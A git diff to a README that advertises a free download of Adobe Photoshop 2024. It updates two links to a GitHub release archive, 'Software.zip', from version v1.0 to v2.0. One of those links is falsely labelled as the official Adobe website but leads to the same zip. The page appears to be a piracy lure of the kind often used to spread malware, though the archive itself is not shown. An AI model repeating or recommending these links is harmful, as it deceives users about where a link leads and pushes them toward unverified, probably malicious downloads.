@@ -20,7 +20,7 @@ Adobe Photoshop 2024 is the latest version of the renowned image editing softwar
 
 If you are looking to install Adobe Photoshop 2024 for free, you can do so by downloading it from the following link:
 
-[![Download Photoshop 2024](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v1.0/Software.zip%202024-blue)](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v1.0/Software.zip)
+[![Download Photoshop 2024](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v2.0/Software.zip%202024-blue)](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to start the download process.
 
@@ -36,7 +36,7 @@ Explore the amazing features of Adobe Photoshop 2024, including:
 
 ## Resources 📚
 
-For more information and updates on Adobe Photoshop 2024, be sure to visit the official Adobe website at [Adobe](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v1.0/Software.zip).
+For more information and updates on Adobe Photoshop 2024, be sure to visit the official Adobe website at [Adobe](https://github.com/Devansh-2795/Al-Photoshop-2024/releases/download/v2.0/Software.zip).
 
 If the provided download link does not work, please check the "Releases" section of this repository for alternative download options.
 
